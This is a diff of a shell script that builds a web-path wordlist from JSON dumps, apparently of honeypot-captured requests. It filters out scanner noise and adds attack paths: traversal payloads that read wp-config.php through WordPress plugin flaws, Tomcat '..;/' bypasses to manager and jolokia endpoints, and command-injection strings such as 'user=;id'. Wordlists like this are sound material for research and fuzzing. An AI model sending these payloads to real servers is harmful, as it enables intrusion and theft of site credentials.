@@ -2,6 +2,7 @@
 
 find dump/ -name "*.json" | xargs cat | jq -r '.["path"]' | grep -E "^/" | sort -uV -o pypotomux.lst
 
+
 # Remove
 grep -viF 'Nxrs4tAtO' pypotomux.lst > /tmp/pypotomux.lst; mv /tmp/pypotomux.lst pypotomux.lst
 grep -viF '/nmaplowercheck' pypotomux.lst > /tmp/pypotomux.lst; mv /tmp/pypotomux.lst pypotomux.lst
@@ -9,6 +10,7 @@ grep -viF '/Nmap/folder' pypotomux.lst > /tmp/pypotomux.lst; mv /tmp/pypotomux.l
 grep -viF '/NmapUpperCheck' pypotomux.lst > /tmp/pypotomux.lst; mv /tmp/pypotomux.lst pypotomux.lst
 grep -viF '/3000D00E0000' pypotomux.lst > /tmp/pypotomux.lst; mv /tmp/pypotomux.lst pypotomux.lst
 grep -viF '/204.48.20.180' pypotomux.lst > /tmp/pypotomux.lst; mv /tmp/pypotomux.lst pypotomux.lst
+
 
 # Sanitize
 grep -viF '/set_ftp.cgi?' pypotomux.lst > /tmp/pypotomux.lst; mv /tmp/pypotomux.lst pypotomux.lst
@@ -46,31 +48,36 @@ echo 'backupmgt/localJob.php?session=fail;id' >> pypotomux.lst
 grep -viF 'cgi-bin/masterCGI?ping=nomip&user=;id' pypotomux.lst > /tmp/pypotomux.lst; mv /tmp/pypotomux.lst pypotomux.lst
 echo 'cgi-bin/masterCGI?ping=nomip&user=;id' >> pypotomux.lst
 
-magmi/web/download_file.php
 
-
-# Add
-echo 'magmi/web/download_file.php' >> pypotomux.lst
-echo 'magmi-importer/web/download_file.php' >> pypotomux.lst
-echo 'amfeed/main/download' >> pypotomux.lst
+# Add# Add
 echo '_fragment' >> pypotomux.lst
-echo '..;/_fragment' >> pypotomux.lst
-echo 'jolokia' >> pypotomux.lst
-echo '..;/jolokia' >> pypotomux.lst
-echo 'manager/html' >> pypotomux.lst
-echo '..;/manager/html' >> pypotomux.lst
-echo 'host-manager/html' >> pypotomux.lst
-echo '..;/host-manager/html' >> pypotomux.lst
-echo 'manager/text/list' >> pypotomux.lst
-echo '..;/manager/text/list' >> pypotomux.lst
-echo 'local/config.txt' >> pypotomux.lst
-echo '..;/local/config.txt' >> pypotomux.lst
-echo 'jkstatus' >> pypotomux.lst
-echo '..;/jkstatus' >> pypotomux.lst
-echo 'actuator' >> pypotomux.lst
-echo '..;/actuator' >> pypotomux.lst
 echo '::$DATA' >> pypotomux.lst
+echo '..;/_fragment' >> pypotomux.lst
+echo '..;/actuator' >> pypotomux.lst
+echo '..;/host-manager/html' >> pypotomux.lst
+echo '..;/jkstatus' >> pypotomux.lst
+echo '..;/jolokia' >> pypotomux.lst
+echo '..;/local/config.txt' >> pypotomux.lst
+echo '..;/manager/html' >> pypotomux.lst
+echo '..;/manager/text/list' >> pypotomux.lst
+echo '/wp-admin/admin-ajax.php?action=ave_publishPost&title=random&short=1&term=1&thumb=../wp-config.php' >> pypotomux.lst
+echo '/wp-admin/admin-ajax.php?action=duplicator_download&file=../wp-config.php' >> pypotomux.lst
+echo '/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php' >> pypotomux.lst
+echo '/wp-admin/admin-ajax.php' >> pypotomux.lst
+echo '/wp-admin/admin-post.php?page=wpsm_responsive_coming_soon' >> pypotomux.lst
+echo '/wp-content/plugins/cherry-plugin/admin/import-export/download-content.php?file=../../../../../wp-config.php' >> pypotomux.lst
+echo 'actuator' >> pypotomux.lst
+echo 'amfeed/main/download' >> pypotomux.lst
+echo 'host-manager/html' >> pypotomux.lst
+echo 'jkstatus' >> pypotomux.lst
+echo 'jolokia' >> pypotomux.lst
+echo 'local/config.txt' >> pypotomux.lst
+echo 'magmi-importer/web/download_file.php' >> pypotomux.lst
+echo 'magmi/web/download_file.php' >> pypotomux.lst
+echo 'manager/html' >> pypotomux.lst
+echo 'manager/text/list' >> pypotomux.lst
 echo 'tatic/plugins/jquery-file-upload/' >> pypotomux.lst
+
 
 # Better formatting
 sed -i -e "s#^/*##g" pypotomux.lst
